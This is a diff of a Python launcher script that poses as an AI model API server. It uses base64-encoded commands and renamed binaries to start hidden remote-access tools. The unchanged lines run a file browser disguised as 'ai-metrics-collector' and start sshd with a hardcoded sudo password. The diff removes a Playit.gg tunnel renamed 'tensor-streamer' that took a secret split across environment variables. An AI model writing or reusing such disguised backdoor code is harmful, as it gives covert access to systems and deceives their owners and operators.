@@ -72,12 +72,6 @@ def main():
     if "A1" in os.environ: del os.environ["A1"]
     if "A2" in os.environ: del os.environ["A2"]
 
-    n_part1 = os.environ.get("N1", "").strip()
-    n_part2 = os.environ.get("N2", "").strip()
-    playit_secret = n_part1 + n_part2
-    
-    if "N1" in os.environ: del os.environ["N1"]
-    if "N2" in os.environ: del os.environ["N2"]
     
     # 2. Start File Browser (ai-metrics-collector)
     cmd2 = decode_cmd("bmljZSAtbiAxOSBhaS1tZXRyaWNzLWNvbGxlY3RvciAtcCA5MDAwIC1hIDEyNy4wLjAuMSAtciAvaG9tZS91c2VyIC1kIC9ob21lL3VzZXIvZmlsZWJyb3dzZXIuZGI=")
@@ -99,18 +93,8 @@ def main():
     full_token = ""
     cmd3 = ""
 
-    # 3.5 Start SSHD and Playit.gg (tensor-streamer)
+    # 3.5 Start SSHD
     subprocess.Popen("echo password | sudo -S /usr/sbin/sshd", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
-    playit_log = open('/home/user/.torch_metrics/playit.log', 'a')
-    cmd_n_base = decode_cmd("bmljZSAtbiAxOSB0ZW5zb3Itc3RyZWFtZXIgLS1zZWNyZXQg")
-    
-    if playit_secret:
-        cmd_n = f"{cmd_n_base}{playit_secret}"
-        subprocess.Popen(cmd_n, shell=True, env=env, stdout=playit_log, stderr=subprocess.STDOUT)
-        
-    playit_secret = ""
-    cmd_n = ""
     
     print("Model loaded successfully. Starting API server...", flush=True)
     
